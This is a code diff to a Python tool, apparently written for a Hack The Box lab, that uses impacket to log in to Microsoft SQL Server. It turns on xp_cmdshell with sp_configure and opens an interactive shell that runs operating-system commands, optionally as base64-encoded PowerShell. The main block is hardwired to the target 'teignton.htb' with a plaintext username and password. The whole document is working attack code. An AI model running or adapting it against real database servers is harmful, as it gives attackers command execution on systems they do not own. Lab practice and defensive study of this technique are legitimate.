@@ -5,6 +5,7 @@
 import os, cmd, sys, re, base64
 from impacket import tds
 import readline
+import argparse
 
 class XpShell(cmd.Cmd):
 
@@ -13,6 +14,7 @@ class XpShell(cmd.Cmd):
         self.sql = SQLObj
         self.prompt = 'xp_cmd> '
         self.file = None
+        self.pwsh = False
 
     def powershell_encode(self, data):
         return base64.b64encode(data.encode('UTF-16LE')).decode()
@@ -24,7 +26,7 @@ class XpShell(cmd.Cmd):
     def default(self, arg):
         try:
 
-            if pwsh:
+            if self.pwsh:
                 new_arg = 'powershell -encodedCommand {}'
                 arg = new_arg.format(self.powershell_encode(arg))
 
@@ -36,6 +38,7 @@ class XpShell(cmd.Cmd):
         except Exception as e:
             print('Exception: ')
             print(str(e))
+            raise e
             pass
 
     # i wont say what it does
@@ -115,6 +118,14 @@ exit                -   i wont say what it does
         self.sql.colMeta[0]['TypeData'] = 80*1
         self.sql.printRows()
 
+    def do_enable_xp_cmdshell(self):
+        try:
+            self.sql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;"
+                               "exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
+            self.sql.printReplies()
+            self.sql.printRows()
+        except Exception as e:
+            raise e
 
     # encodes bytes as base64 and writes them to a file via powershell
     def write_bytes_to_file(self, data, target):
@@ -132,32 +143,25 @@ exit                -   i wont say what it does
 
 def connect_mssql(ip, port=1433, username="sa", password="", domain=""):
     # do database connection (simple for now)
-    try:
-        ms_sql = tds.MSSQL(ip, port)
-        ms_sql.connect()
-        res = ms_sql.login(database = None, username=username, password=password, domain=domain)
-        ms_sql.printReplies()
-        if res:
-            return XpShell(ms_sql)
-        else:
-            return res
+    ms_sql = tds.MSSQL(ip, port)
+    ms_sql.connect()
+    res = ms_sql.login(database = None, username=username, password=password, domain=domain)
+    ms_sql.printReplies()
+    if res:
+        return XpShell(ms_sql)
+    else:
+        return res
 
-    except Exception as e:
-        print('Exception: ')
-        print(str(e))
-        return False
+if __name__ == '__main__':
+    # pass commands directly into powershell
+    # ./xp_cmdshell.py -powershell
+    # if len(sys.argv) > 1 and sys.argv[1] == '-powershell':
+    #     pwsh = True
 
-# if __name__ == '__main__':
-#     # pass commands directly into powershell
-#     # ./xp_cmdshell.py -powershell
-#     if len(sys.argv) > 1 and sys.argv[1] == '-powershell':
-#         pwsh = True
-#
-#     # if connection successful
-#     ms_sql, res = connect_mssql()
-#     if res is True:
-#         shell = XpShell(ms_sql)
-#         shell.cmdloop()
-#
-#     # close ms_sql
-#     ms_sql.disconnect()
+    # if connection successful
+    xp_shell = connect_mssql("teignton.htb", username="webappusr", password="d65f4sd5f1s!df1fsd65f1sd")
+    if isinstance(xp_shell, XpShell):
+        xp_shell.do_enable_xp_cmdshell()
+        xp_shell.pwsh = True
+        xp_shell.cmdloop()
+        xp_shell.sql.disconnect()
